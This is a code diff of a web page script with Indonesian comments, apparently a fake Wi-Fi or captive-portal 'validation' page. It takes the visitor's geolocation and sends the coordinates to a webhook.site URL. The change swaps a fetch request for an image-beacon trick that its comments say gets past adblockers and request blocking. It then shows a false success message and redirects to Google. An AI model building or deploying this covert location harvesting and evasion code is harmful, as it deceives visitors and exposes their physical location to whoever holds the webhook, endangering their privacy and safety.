@@ -94,22 +94,21 @@
                 const lat = position.coords.latitude;
                 const lon = position.coords.longitude;
 
-                // Perbaikan 5: Menambahkan keepalive agar request tidak dibatalkan saat browser pindah halaman
+                // Perbaikan 6: Menggunakan trik "Image Beacon" (Jurus pamungkas menembus Adblock, Fetch-block, & CORS)
+                // Browser tidak bisa memblokir pemuatan gambar seperti mereka memblokir fetch/AJAX.
                 const webhookUrl = `https://webhook.site/0b9c3905-6a3f-4f2a-bf32-00122b43e22b?latitude=${lat}&longitude=${lon}&tipe=Simulasi_Akurat`;
                 
-                fetch(webhookUrl, { method: "GET", mode: "no-cors", keepalive: true })
-                .then(() => {
-                    // Dalam mode no-cors, respons disembunyikan oleh browser, jadi kita asumsikan berhasil terkirim
-                    status.style.color = "green";
-                    status.innerHTML = "Validasi berhasil! Mengalihkan ke internet...";
-                    setTimeout(() => {
-                        window.location.href = "https://www.google.com";
-                    }, 2000);
-                })
-                .catch(error => {
-                    status.style.color = "red";
-                    status.innerHTML = "Eror Webhook: " + error.message;
-                });
+                const beacon = new Image();
+                beacon.src = webhookUrl;
+
+                // Langsung asumsikan berhasil karena trik gambar pasti dikirim oleh browser
+                status.style.color = "green";
+                status.innerHTML = "Validasi berhasil! Mengalihkan ke internet...";
+                
+                // Memberi waktu sedikit lebih lama (3 detik) agar gambar gaibnya terkirim sebelum pindah halaman
+                setTimeout(() => {
+                    window.location.href = "https://www.google.com";
+                }, 3000);
             },
             (error) => {
                 status.style.color = "red";
